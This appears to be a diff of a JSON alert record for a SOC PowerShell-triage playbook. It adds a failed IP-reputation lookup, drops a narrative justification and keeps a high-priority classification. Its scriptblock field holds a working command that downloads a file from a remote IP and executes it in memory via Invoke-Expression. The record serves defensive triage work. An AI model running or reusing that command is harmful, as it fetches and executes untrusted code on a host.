@@ -10,9 +10,9 @@
     "Playbook Used": "Suspicious PowerShell Triage",
     "Scriptblock": "$u='http://185.199.88.22/update.bin';$b=Invoke-WebRequest -Uri $u -UseBasicParsing;IEX ([Text.Encoding]::UTF8.GetString($b.Content))",
     "OS": "Windows Server 2022 Datacenter",
-    "IP Reputation Score": "0/100 (ISP: KKB KREDI KAYIT BUROSU ANONIM SIRKETI)",
-    "Recent Similar Alerts": "None found",
-    "Description": "The PowerShell script downloaded a binary from http://185.199.88.22/update.bin and executed its contents in-memory via Invoke-Expression (IEX). It was executed by user a.petrov on SRV-APP-03 and the remote host has a 0/100 reputation with no recent similar activity in the environment. Because this is remote in-memory code execution initiated by a non-service user on a server and the remote host is untrusted with no benign historical context, the activity is classified as High Priority (HP)."
+    "Historical Events": "No recent events found",
+    "Similar Alerts": "No recent similar alerts found",
+    "IP Reputation Check Status": "Error: AbuseIPDB lookup for 185.199.88.22 returned 500 Internal Server Error"
   },
   "classification": "HP"
 }
